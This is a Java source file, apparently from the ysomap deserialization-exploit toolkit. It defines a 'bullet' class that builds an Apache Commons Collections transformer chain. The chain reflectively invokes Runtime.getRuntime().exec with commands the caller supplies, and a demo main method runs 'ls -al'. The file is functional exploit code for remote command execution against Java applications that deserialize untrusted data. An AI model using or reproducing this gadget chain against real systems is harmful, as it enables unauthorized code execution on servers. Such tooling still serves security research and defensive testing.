package ysomap.gadget.bullet.collections;

import ysomap.gadget.ObjectGadget;
import ysomap.util.Reflections;

import java.lang.reflect.Array;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@SuppressWarnings ( "rawtypes" )
public class TransformerBullet implements ObjectGadget<Object> {

    String[] args;

    int version = 3;// 默认生成commonscollections 3.2.1

    Class transformerClazz;

    Class constantTransformerClazz;

    Class invokerTransformerClazz;

    public TransformerBullet(String[] args, int version) {
        this.args = args;
        this.version = version!=3 ? 4 : 3;
        initClazz();
    }

    @Override
    public Object getObject() throws Exception {
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(Runtime.class));
        transformers.add(createInvokerTransformer("getMethod", new Class[] {String.class, Class[].class },
                            new Object[] {"getRuntime", new Class[0] }));
        transformers.add(createInvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {
                null, new Object[0] }));
        transformers.add(createInvokerTransformer(
                "exec", new Class[] { String.class }, args));
        transformers.add(createConstantTransformer(1));

        return createTransformerArray(transformers);
    }

    public void setVersion(int version) {
        this.version = version;
    }

    private void initClazz(){
        try{
            if(version == 3){
                transformerClazz = Class.forName("org.apache.commons.collections.Transformer");
                constantTransformerClazz = Class.forName("org.apache.commons.collections.functors.ConstantTransformer");
                invokerTransformerClazz = Class.forName("org.apache.commons.collections.functors.InvokerTransformer");
            }else{
                transformerClazz = Class.forName("org.apache.commons.collections4.Transformer");
                constantTransformerClazz = Class.forName("org.apache.commons.collections4.functors.ConstantTransformer");
                invokerTransformerClazz = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
            }
        }catch(ClassNotFoundException e){
            e.printStackTrace();
        }
    }

    public Object createTransformerArray(LinkedList<Object> transformers) throws ClassNotFoundException {
        Object transformerArray =
                Array.newInstance(transformerClazz, transformers.size());
        for(int i=0; i< transformers.size(); i++){
            Array.set(transformerArray, i, transformers.get(i));
        }
        return transformerArray;
    }

    public Object createConstantTransformer(Object args) throws Exception {
        return Reflections.newInstance(constantTransformerClazz.getName(), new Class[]{Object.class}, args);
    }

    public Object createInvokerTransformer(Object... args) throws Exception {
        return Reflections.newInstance(invokerTransformerClazz.getName(),
                            new Class[]{String.class, Class[].class, Object[].class},
                            args);
    }

    public static void main(String[] args) {
        ObjectGadget bullet = new TransformerBullet(new String[]{"ls -al"},4);
        try {
            Object obj = bullet.getObject();
            System.out.println(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
